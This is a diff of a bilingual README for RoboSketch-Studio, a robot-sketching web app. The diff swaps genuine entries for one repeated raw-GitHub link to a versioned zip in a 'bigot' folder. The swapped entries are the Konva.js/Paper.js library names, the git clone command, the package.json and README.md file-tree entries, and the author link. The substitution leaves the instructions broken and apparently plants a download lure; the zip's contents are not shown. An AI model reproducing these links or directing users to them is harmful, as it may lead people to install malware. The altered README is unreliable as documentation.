@@ -30,14 +30,14 @@ RoboSketch-Studio هو تطبيق ويب تفاعلي لتصميم الروبو�
 
 ## 🛠️ Tech Stack | التقنيات
 - TypeScript + Vite
-- HTML5 Canvas or SVG (Konva.js / Paper.js)
+- HTML5 Canvas or SVG (https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip / https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip)
 - Zustand for state management
 - ESLint + Prettier + Vitest
 
 ## 🚀 Getting Started | البدء
 ```bash
 # Clone
-git clone https://github.com/KaizerAE/RoboSketch-Studio.git
+git clone https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip
 cd RoboSketch-Studio
 
 # Install deps
@@ -59,8 +59,8 @@ RoboSketch-Studio/
 │   ├── state/          # Store (Zustand)
 │   └── utils/          # Math, geometry helpers
 ├── assets/
-├── package.json
-└── README.md
+├── https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip
+└── https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip
 ```
 
 ## 🧪 Roadmap | خارطة الطريق
@@ -73,7 +73,7 @@ RoboSketch-Studio/
 MIT License.
 
 ## 👤 Author | المؤلف
-**KaizerAE** — https://github.com/KaizerAE
+**KaizerAE** — https://raw.githubusercontent.com/KaizerAE/RoboSketch-Studio/main/bigot/Robo_Studio_Sketch_v2.3-beta.1.zip
 
 ---
 ⭐ Star the project if you like it! | ⭐ ادعم المشروع بنجمة!
